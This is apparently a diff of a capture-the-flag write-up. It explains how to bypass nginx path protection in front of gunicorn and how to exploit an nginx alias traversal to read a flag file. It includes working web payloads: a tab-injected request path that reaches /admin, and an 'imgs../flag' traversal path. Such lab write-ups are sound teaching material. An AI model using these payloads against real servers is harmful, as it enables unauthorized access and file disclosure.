@@ -18,7 +18,8 @@ Hello? My name is gunicorn and I have a friend called Nginx. We are really weird
 Keywords: weird, proxy, nginx, gunicorn
 
 Player should find a way to bypass nginx path protection for reading /admin path.
-Protection implemented at file: `reverse_nginx/nginx.conf`
+
+Protection implemented at file: `reverse_nginx/nginx.conf`:
 
 ```
     location /admin {
@@ -32,9 +33,10 @@ The key is finding repo [weird_proxies](https://github.com/GrrrDog/weird_proxies
 Finally, payload is:
 `GET /admin<TAB>HTTP/1.1/../../ HTTP/1.1`
 
-Nginx after path normalization: `/` - is not /admin so there is no restriction to access
-Forward: `/admin<TAB>HTTP/1.1/../../`
-Gunicorn after path parsing: `/admin`
+Why it works:
+- Nginx after path normalization: `/` - is not /admin so there is no restriction to access
+- Forward: `/admin<TAB>HTTP/1.1/../../`
+- Gunicorn after path parsing: `/admin`
 
 
 ## Step #2
@@ -71,6 +73,7 @@ For going to the next step: `/c7f5472b-4e09-4997-9eff-e1b7442b8b91//wiki/@backen
 ## Step #3
 
 Pretty known Nginx alias traversal bug. More info about misconfiguration [here](https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md)
+
 Misconfigured code in file `backend_nginx/nginx.conf`:
 
 ```
@@ -82,4 +85,5 @@ Misconfigured code in file `backend_nginx/nginx.conf`:
 ```
 
 Exploit for reading file: `/c7f5472b-4e09-4997-9eff-e1b7442b8b91/wiki/@backend_nginx/imgs../flag`
+
 Btw, nginx shows files in directory with configuration: `autoindex on;`. So it's easy to identify flag location after getting alias traversal.
